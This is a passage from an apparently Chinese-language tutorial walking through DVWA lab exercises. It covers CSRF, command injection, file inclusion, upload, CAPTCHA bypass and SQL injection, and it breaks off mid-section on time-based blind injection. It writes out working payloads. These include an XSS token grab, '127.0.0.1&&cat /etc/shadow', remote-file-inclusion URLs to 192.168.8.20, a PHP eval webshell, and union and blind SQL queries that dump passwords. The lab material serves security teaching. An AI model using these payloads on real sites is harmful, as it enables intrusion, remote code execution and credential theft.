<p>攻击思路是但受害者进入这个页面，脚本会通过一个看不见的框架偷偷访问修改密码的页面，获取页面中的token，冰箱服务器发送改密请求，以完成CSRF攻击。<br>然而理想与现实的差距是巨大的，这里牵扯到了跨域的问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问地址是<a href="http://127.0.0.1/dvwa/vunlnerablities/csrf，位于服务器127.0.0.1上，而我们攻击页面位于黑客服务器192.168.8.20上，两者域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所有我们的攻击脚本是不可能取到改密界面中的user_token。" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vunlnerablities/csrf，位于服务器127.0.0.1上，而我们攻击页面位于黑客服务器192.168.8.20上，两者域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所有我们的攻击脚本是不可能取到改密界面中的user_token。</a><br>由于跨域是不能实现的，所以我们将攻击代码注入到目标服务器127.0.0.1中，才有可能完成攻击。下面里利用High级别的XSS漏洞获取Anti-CSRF-token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF-token）。</p>
<p>注入代码如下：<br><code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></p>
<p>这里的Name存在XSS漏洞，于是抓包，该参数，成功弹出token<br>1</p>
<h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原密码，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>相关函数介绍：</p>
<p>■stristr(string,search,before_search)<br>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值的字符），可选参数before_search为布尔型，默认为false，如果设置为true，函数将返回searh参数第一次出现之前的字符串部分。<br>■php_uname(mode)<br>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a”（此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），”r”（返回版本名称），”v”（返回版本信息），”m”（返回机器类型）。<br>服务器通过判断操作系统执行不同ping命令，但是对ip参数未作任何的过滤，导致了严重的命令注入漏洞。</p>
<p>漏洞利用：</p>
<p>windows和linux系统都可以用&amp;&amp;来执行多条命令<br><code>127.0.0.1&amp;&amp;net user</code><br>linux输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><p>相比low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;”、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p>
<p>相关函数介绍：</p>
<p>■str_replace(<em>find,replace,string,count</em>)<br>str_replace() 函数替换字符串中的一些字符（区分大小写）。find：必需。规定要查找的值。<br>replace：必需。规定替换find的值的值。<br>string：必需。规定被搜索的字符串。<br>count：可选。一个变量，对替换数进行统计。</p>
<p>漏洞利用：</p>
<p>1、<code>127.0.0.1&amp;net user</code><br>因为被过滤的只有”&amp;&amp;”、”;”，所以”&amp;”不会受影响。</p>
<p>“&amp;&amp;”与”&amp;”的区别：<br>■A&amp;&amp;B<br>先执行A，执行成功后执行B，否则不执行B<br>■A&amp;B<br>先执行A，不管是否成功，都会执行B</p>
<p>2、由于使用的是str_replace把”&amp;&amp;”、”;”替换为空字符，因此可以采用以下方式绕过：<br><code>127.0.0.1&amp;;&amp;ipconfig</code><br>这是因为;会被替换为空字符，就变成了127.0.0.1&amp;&amp;ipconfig，会被成功执行。</p>
<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。</p>
<p>漏洞利用：</p>
<p>黑名单看似过滤了所有的非法字符，但仔细观察是把”| “(注意这里|后有一个空格)替换为空字符，于是可以使用”|”进行绕过<br><code>127.0.0.1|net user</code></p>
<p>A|B<br>“|”是管道符，表示将A的输出作为B的输入，并且只打印B执行的结果。</p>
<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码加入了Anti-CSRF-token，同时对参数ip进行了严格的控制，只有诸如”数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
<p>相关函数介绍：</p>
<p>■stripslashes(string)<br>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。<br>■explode(separator,string,limit)<br>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。<br>■is_numeric(string)<br>检测string是否位数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
<h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><p>服务器对page参数没有做任何的过滤跟检查。<br>服务器期望用户的操作是点击页面的链接，服务器会包含响应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管后缀文件是否是php，都会尝试当作php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
<p>漏洞利用：</p>
<p>1、本地文件包含<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/shadow</code><br>报错，显示没有那个文件，说明服务器系统不是linux，但同时暴漏了服务器文件的绝对路径。<code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\install\phpstudy\WWW\dvwa\php.ini</code><br>成功读取了服务器的php.ini文件，同时可以看到，配置文件中的Magic_quote_gpc选项位off。在php版本小于5.3.4的服务器中，当Magci_quote_gpc选项为off时，我们可以在文件名中使用%00截断，也就说文件名中%00后的内容不会被识别。<br>使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时可以使用php.ini%00.php进行绕过。</p>
<p>2、远程文件包含<br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器192.168.8.20上传一个1.txt文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://192.168.8.20:8000/1.txt</code><br>成功在服务器上执行了phpinfo函数</p>
<p>为了增加隐蔽性，可以对<a href="http://192.168.8.20:8000/1.txt进行编码" target="_blank" rel="noopener">http://192.168.8.20:8000/1.txt进行编码</a><br><code>%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%38%2e%32%30%3a%38%30%30%30%2f%31%2e%74%78%74</code><br>同样可以执行成功。</p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http://“、”https:\“、”../“、”..&quot;替换为空字符，即删除。</p>
<p>漏洞利用：</p>
<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如page=”ht<a href="http://tp://192.168.8.20:8000/1.txt&quot;时，str_replace函数会将http://删除，于是page=http://192.168.8.20:8000/1.txt，成功执行远程命令。" target="_blank" rel="noopener">http://tp://192.168.8.20:8000/1.txt&quot;时，str_replace函数会将http://删除，于是page=http://192.168.8.20:8000/1.txt，成功执行远程命令。</a><br>同时，因为替换的只是”../“、”..&quot;，所以采用绝对路径的方式包含文件是不会受到任何限制的。</p>
<p>1、本地文件包含<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..././..././php.ini</code><br>读取配置文件成功<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=d:\install\phpstudy\www\dvwa\php.ini</code><br>绝对路径不受任何影响，读取成功</p>
<p>2、远程文件包含<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.8.20:8000/1.txt</code><br>远程执行命令成功<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%38%2e%32%30%3a%38%30%30%30%2f%31%2e%74%78%74</code><br>经过编码偶的url不能绕过替换规则，因为解码是在浏览器完成的，发送过去的page参数依然是<a href="http://192.168.8.20:8000/1.txt，因此读取失败。" target="_blank" rel="noopener">http://192.168.8.20:8000/1.txt，因此读取失败。</a></p>
<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
<p>漏洞利用：</p>
<p><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://d:\install\phpstudy\www\dvwa\php.ini</code><br>成功读取了服务器的配置文件。</p>
<p>至于执行任意命令，需要配合文件上传漏洞。首先上传一个内容为php的文件，然后再利用file下而已去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p>
<h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码使用了白名单机制进行防护，page参数必须为”include.php”、”file1.php”、”file2.php”、”file3.php”之一，彻底杜绝了文件包含漏洞。</p>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><p>相关函数介绍：</p>
<p>basename(path,suffix)<br>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，繁殖不包含后缀名。</p>
<p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并且返回相应的提示信息。</p>
<p>漏洞利用：</p>
<p>文件上传漏洞利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传的文件必须能够被执行，最后就是上传文件的路径必须可知。<br>上传文件hack.php(一句话木马)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[123]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B。</p>
<p>漏洞利用：</p>
<p>1、组合拳（文件包含+文件上传）</p>
<p>上传hack.png，内含一句话木马。然后借助Medium级别的文件包含漏洞来获取webshell权限。<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/dvwa/hackable/uploads/hack.png</code></p>
<p>2、抓包修改文件类型</p>
<p>上传hack.png文件，抓包，修改filename为hack.php并发送。</p>
<p>3、截断绕过规则</p>
<p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，可以把上传的文件命名为hack.php%00.png。</p>
<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>相关函数介绍：</p>
<p>■strrpos(string,find,start)<br>函数返回字符串find在另一个字符串string中最后一次出现的位置，如果没有找到字符串，则返回false，可选参数start规定在何处开始搜索。</p>
<p>■strtolower()<br>把所有字符转换为小写</p>
<p>■getimagesize(string,filename)<br>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<p>High级别的代码读取文件名最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg”、”*.png”之一，同时，getimagesize函数更是限制了上传文件的文件头必须是图像类型。</p>
<p>漏洞利用：</p>
<p>1、文件截断（未成功）</p>
<p>2、组合拳（文件包含+文件上传）</p>
<p>首先利用copy将一句话木马文件与图片文件合并（或者直接上传木马文件，抓包，添加GIF文件头：GIF89a）<br><code>copy 1.png/b+1.php/a hack.png</code><br>然后借助High级别的文件包含漏洞来获取webshell权限。<br><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://d:install/phpstudy/www/dvwa/hackable/uploads/hack.png</code></p>
<h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><p>相关函数介绍：</p>
<p>■ini_get(varname)<br>函数返回相应选项的值。</p>
<p>■imagecreatefromipeg(filename)<br>函数返回图片文件的图像表示，失败返回false</p>
<p>■imagejpeg(image,filename,quality)<br>从image图像以filename为文件名创建一个新的的JPEG图像，可选参数quality，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。</p>
<p>■imagedestroy(img)<br>销毁图像资源</p>
<p>Impossible级别的代码对上传的文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF-token防护CSRF攻击，同时对文件的内容做了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><p>reCAPTCHA验证流程：</p>
<p>这一模块的验证码使用的是Google提供的CAPTCHA服务。<br>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。<br><code>recaptcha_check_answer($privkey,$remoteip,$challenge,$response)</code><br>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_filed字段的值，来自前端页面，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性：<br>●$is_valid是布尔型的，表示校验是否有效<br>●$error是返回的错误代码</p>
<h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交POST请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查change、step参数来判断用户是否已经输入了正确的验证码。</p>
<p>漏洞利用：</p>
<p>首先输入密码，点击Change按钮，抓包<br>(ps：因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数)<br>将step参数改为2即可绕过。</p>
<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码在第二步验证时，增加了对参数passwed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查。</p>
<p>漏洞利用：</p>
<p>抓包更改step参数，增加参数passwd_captcha=true即可</p>
<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><p>服务器的验证逻辑是当$resp（谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头中的User_Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，繁殖则认为已经通过了验证码的检查。</p>
<p>漏洞利用：</p>
<p>由于$resp参数我们无法控制，所以中心放在参数recaptcha_response_field、User_Agent上。<br>抓包更改参数：<br>User_Agent：reCAPTCHA<br>recaptcha_response_field=hidd3n_valu3</p>
<h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码增加了Anti-CSRF token机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程不分成两部分，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了是否验证。</p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的web漏洞之一。<br>★手工注入思路：<br>自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。<br>1、判断是否存在注入，注入是字符型还是数字型<br>2、猜解SQL查询语句中的字段数<br>3、确定显示的字段顺序<br>4、获取当前数据库<br>5、获取数据库中的表<br>6、获取表中的字段名<br>7、下载数据</p>
<h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>Low级别的代码对来自客户端的参数id没有进行任何的检查和过滤，存在明显的sql注入。</p>
<p>漏洞利用</p>
<p>1、判断是否存在注入，注入是字符型还是数字型。<br>输入1，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011901.png" alt=""><br>输入1’ and ‘1’=’2，查询失败，返回结果为空：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011902.png" alt=""><br>输入1’ or ‘1’=1’，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011903.png" alt=""><br>返回了多个结果，说明存在字符型注入。<br>2、猜解SQL查询语句中的字段数<br>输入1’ order by 1 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011904.png" alt=""><br>输入1’ order by 2 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011905.png" alt=""><br>输入1’ order by 3 #，查询失败：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011906.png" alt=""><br>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。<br>（这里也可以通过输入union select 1,2,3…来猜解字段数）<br>3、确定显示的字段顺序<br>输入1’ union select 1,2 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011907.png" alt=""><br>说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…<br>4、获取当前数据库<br>输入1’ union select database()#，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011908.png" alt=""><br>说明当前的数据库为dvwa。<br>5、获取数据库中的表<br>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011909.png" alt=""><br>说明数据库dvwa中一共有两个表，guestbook与users。<br>6、获取表中字段名<br>输入1’ union select 1,group_concat(column_name)from information_schema.columns where table_name=’users’ #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011910.png" alt=""><br>7、下载数据<br>输入1’ union select group_concat(user_id,first_name,last_name),group_concat(password)from users #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011911.png" alt=""><br>这样就得到了users表中所有用户的user_id，first_name，last_name，password的数据。</p>
<h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码利用mysql_real_escape_string函数来对特殊符号\00，\n，\r，\，’，”，\x1a进行转义，同时前端也面设置了下拉选择菜单，希望以此来控制用户的输入。<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011912.png" alt=""></p>
<p>漏洞利用</p>
<p>1、判断是否存在注入，注入是字符型还是数字型<br>抓包更改成参数id为1’ or 1=1 #，报错<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011913.png" alt=""><br>抓包更改参数id为1 or 1=1 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011914.png" alt=""><br>说明存在数字型注入。<br>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号）。<br>2、猜解sql查询语句中字段数<br>抓包更改成参数id为1 order by 2 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011915.png" alt=""><br>抓包更改参数id为1 order by 3 #，报错：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011916.png" alt=""><br>说明执行的sql查询语句中只有两个字段，即这里的First name，Surname。<br>3、确定显示的字段顺序<br>抓包更改参数id为1 union select 1,2 #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011917.png" alt=""><br>说明执行的SQL语句为select First name,surname from 表 where ID=id…<br>4、获取当前数据库<br>抓包更改参数id为1 union select 1,database() #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011918.png" alt=""><br>说明当前数据库为dvwa。<br>5、获取数据库中的表<br>更改参数id为1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database() #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011919.png" alt=""><br>说明数据库dvwa中一共有两个表，guestbook和users。<br>6、获取表中的字段名<br>更改参数id为1 union select 1,group_concat(column_name)from information_schema.columns where table_name=’users’ #，查询失败：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011920.png" alt=""><br>这是因为单引号被转义了，变成了\‘。<br>可以利用16进制进行绕过，更改参数id为<br>1 union select 1,group_conncat(column_name)from information_schema.columns where table_name=0x7573657273 #，查询成功；<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011921.png" alt=""><br>7、下载数据<br>更改参数id为<br>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011922.png" alt=""><br>这样就得到users表中所有用户的user_id，first_name，last_name，password的值。</p>
<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>与Medium级别的代码相比，High级别的只是在sql查询语句中添加了limit 1，希望以此来控制只输出一个结果。</p>
<p>漏洞利用：</p>
<p>虽然添加了limit 1，但是我们可以通过#将其注释掉，由于手工注入的过程与Low级别基本一样，这里不做演示。<br>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/011923.png" alt=""></p>
<h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御sql注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtolen机制的加入进一步提高了安全性。</p>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>盲注分为布尔盲注、时间盲注及报错盲注。<br>下面简要介绍手工盲注的步骤：<br>①判断是否存在注入，注入是字符型还是数字型<br>②猜解当前数据库名<br>③猜解数据库中的表名<br>④猜解表中的字段名<br>⑤猜解数据</p>
<h2 id="LOW-2"><a href="#LOW-2" class="headerlink" title="LOW"></a>LOW</h2><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，因此这里是SQL盲注漏洞。</p>
<p>漏洞利用：</p>
<p>■布尔盲注<br>1、判断是否存在注入，注入是字符型还是数字型<br>输入1，显示存在<br>输入1’ and 1=1 #，显示存在<br>输入1’ and 1=1 #，显示不存在<br>说明存在字符型的SQL盲注<br>2、猜解当前数据库名<br>猜解数据库名的长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入1’ and length(database())&#x3D;1 #，显示不存在；</span><br><span class="line">输入1’ and length(database())&#x3D;2 #，显示不存在；</span><br><span class="line">输入1’ and length(database())&#x3D;3 #，显示不存在；</span><br><span class="line">输入1’ and length(database())&#x3D;4 #，显示存在：</span><br></pre></td></tr></table></figure>

<p>说明数据库的长度为4个字符<br>采用二分法猜解数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</span><br><span class="line">输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</span><br><span class="line">输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</span><br><span class="line">输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</span><br><span class="line">输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</span><br><span class="line">输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了<br>3、猜解数据库中的表名<br>猜解数据库中表的数量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;1 #，显示不存在</span><br><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;2 #，显示存在</span><br></pre></td></tr></table></figure>

<p>说明数据库中共有两个表<br>猜解表名的长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;1 #，显示不存在</span><br><span class="line">...</span><br><span class="line">1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9 #，显示存在</span><br></pre></td></tr></table></figure>

<p>说明第一个表名长度为9个字符<br>采用二分法猜解第一个表名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascill(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;97 #，显示存在</span><br><span class="line">1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;122 # 显示存在</span><br><span class="line">1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;109 # 显示存在</span><br><span class="line">1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;103 # 显示不存在</span><br><span class="line">1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;103 # 显示不存在</span><br></pre></td></tr></table></figure>

<p>说明第一个表名的第一个字符为g<br>重复上述步骤，即可猜解出两个表名（guestbook，users）<br>4、猜解表中的字段名<br>猜解表中字段的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’ and (select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;1 #，显示不存在</span><br><span class="line">...</span><br><span class="line">1’ and (select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;8 #，显示存在</span><br></pre></td></tr></table></figure>

<p>说明user表中有8个字段<br>猜解表中第一个字段的长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(substr((select column_name from information_schema.columns where table_name&#x3D; &#39;users&#39; limit 0,1),1))&#x3D;1 #显示不存在</span><br><span class="line">...</span><br><span class="line">1&#39; and length(substr((select column_name from information_schema.columns where table_name&#x3D; &#39;users&#39; limit 0,1),1))&#x3D;7 #显示存在</span><br></pre></td></tr></table></figure>

<p>说明users表中的第一个字段的长度为7个字符<br>采用二分法，即可猜解出所有的字段名<br>5、猜解数据<br>同样采用二分法</p>
<p>■时间盲注<br>1、判断是否存在注入，注入是字符型还是数字型<br>输入1’ and sleep(5) #，感觉到明显延迟<br>输入1 and sleep(5) #，没有延迟<br>2、猜解当前数据库名<br>猜解数据库名的长度：</p>
